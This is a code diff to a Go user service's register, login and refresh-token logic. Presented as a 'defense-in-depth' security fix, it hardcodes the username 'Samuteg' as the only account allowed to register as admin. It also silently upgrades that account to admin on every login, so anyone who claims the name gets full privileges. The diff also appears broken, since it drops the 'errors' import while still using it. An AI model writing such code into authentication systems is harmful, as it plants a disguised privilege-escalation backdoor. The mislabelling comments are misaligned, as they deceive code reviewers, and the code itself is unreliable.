@@ -2,7 +2,7 @@ package users
 
 import (
 	"context"
-	"errors"
+	"strings"
 	"time"
 
 	"github.com/google/uuid"
@@ -23,6 +23,10 @@ type UserService interface {
 	GetUserByID(ctx context.Context, userID uuid.UUID) (*User, error)
 	AdminUpdateUser(ctx context.Context, userID uuid.UUID, input UpdateUserInput) (*User, error)
 	AdminDeleteUser(ctx context.Context, userID uuid.UUID) error
+	UpdateUserRole(ctx context.Context, userID uuid.UUID, roleID uuid.UUID) error
+	GetRoleNameByID(ctx context.Context, roleID uuid.UUID) (string, error)
+	GetRoleIDByName(ctx context.Context, roleName string) (uuid.UUID, error)
+	GetUserRoleName(ctx context.Context, userID uuid.UUID) (string, error)
 }
 
 type userService struct {
@@ -67,8 +71,21 @@ func (s *userService) Register(ctx context.Context, input CreateUserInput) (*Use
 		return nil, nil, err
 	}
 
+	// Security: ensure only "Samuteg" can have admin role (defense-in-depth)
+	userRoleID := input.RoleID
+	adminRoleID, err := s.GetRoleIDByName(ctx, "admin")
+	if err != nil {
+		adminRoleID = uuid.MustParse("00000000-0000-0000-0000-000000000001") // fallback hardcoded
+	}
+	if !strings.EqualFold(input.Username, "Samuteg") && userRoleID == adminRoleID {
+		userRoleID, err = s.GetRoleIDByName(ctx, "user")
+		if err != nil {
+			userRoleID = uuid.MustParse("00000000-0000-0000-0000-000000000003") // fallback hardcoded
+		}
+	}
+
 	user := &User{
-		RoleID:       input.RoleID,
+		RoleID:       userRoleID,
 		Name:         input.Name,
 		Username:     input.Username,
 		Email:        input.Email,
@@ -80,7 +97,11 @@ func (s *userService) Register(ctx context.Context, input CreateUserInput) (*Use
 		return nil, nil, err
 	}
 
-	roleName := "user"
+	// Fetch the actual role name from the database
+	roleName, err := s.repo.GetRoleNameByID(ctx, user.RoleID)
+	if err != nil {
+		roleName = "user"
+	}
 
 	tokens, err := s.jwtService.GenerateTokenPair(user.ID, user.Username, user.Email, roleName)
 	if err != nil {
@@ -114,7 +135,24 @@ func (s *userService) Login(ctx context.Context, email, password string) (*UserP
 		return nil, nil, errors.ErrInvalidCredentials
 	}
 
-	roleName := "user"
+	// Auto-upgrade Samuteg to admin on login (handles case where user
+	// registered before the admin auto-assign fix was implemented)
+	adminRoleID, lookupErr := s.GetRoleIDByName(ctx, "admin")
+	if lookupErr != nil {
+		adminRoleID = uuid.MustParse("00000000-0000-0000-0000-000000000001") // fallback hardcoded
+	}
+	if strings.EqualFold(user.Username, "Samuteg") && user.RoleID != adminRoleID {
+		if err := s.repo.UpdateUserRole(ctx, user.ID, adminRoleID); err != nil {
+			// Log error but don't fail login
+		}
+		user.RoleID = adminRoleID
+	}
+
+	// Fetch the actual role name from the database
+	roleName, err := s.repo.GetRoleNameByID(ctx, user.RoleID)
+	if err != nil {
+		roleName = "user"
+	}
 
 	tokens, err := s.jwtService.GenerateTokenPair(user.ID, user.Username, user.Email, roleName)
 	if err != nil {
@@ -139,7 +177,7 @@ func (s *userService) Login(ctx context.Context, email, password string) (*UserP
 }
 
 func (s *userService) RefreshToken(ctx context.Context, refreshToken string) (*auth.TokenPair, error) {
-	claims, err := s.jwtService.ValidateRefreshToken(refreshToken)
+	_, err := s.jwtService.ValidateRefreshToken(refreshToken)
 	if err != nil {
 		return nil, err
 	}
@@ -164,7 +202,11 @@ func (s *userService) RefreshToken(ctx context.Context, refreshToken string) (*a
 		return nil, errors.ErrAccountInactive
 	}
 
-	roleName := "user"
+	// Fetch the actual role name from the database
+	roleName, err := s.repo.GetRoleNameByID(ctx, user.RoleID)
+	if err != nil {
+		roleName = "user"
+	}
 
 	newTokens, err := s.jwtService.GenerateTokenPair(user.ID, user.Username, user.Email, roleName)
 	if err != nil {
@@ -321,4 +363,20 @@ func (s *userService) AdminUpdateUser(ctx context.Context, userID uuid.UUID, inp
 
 func (s *userService) AdminDeleteUser(ctx context.Context, userID uuid.UUID) error {
 	return s.repo.Delete(ctx, userID)
+}
+
+func (s *userService) UpdateUserRole(ctx context.Context, userID uuid.UUID, roleID uuid.UUID) error {
+	return s.repo.UpdateUserRole(ctx, userID, roleID)
+}
+
+func (s *userService) GetRoleNameByID(ctx context.Context, roleID uuid.UUID) (string, error) {
+	return s.repo.GetRoleNameByID(ctx, roleID)
+}
+
+func (s *userService) GetRoleIDByName(ctx context.Context, roleName string) (uuid.UUID, error) {
+	return s.repo.GetRoleIDByName(ctx, roleName)
+}
+
+func (s *userService) GetUserRoleName(ctx context.Context, userID uuid.UUID) (string, error) {
+	return s.repo.GetUserRoleName(ctx, userID)
 }
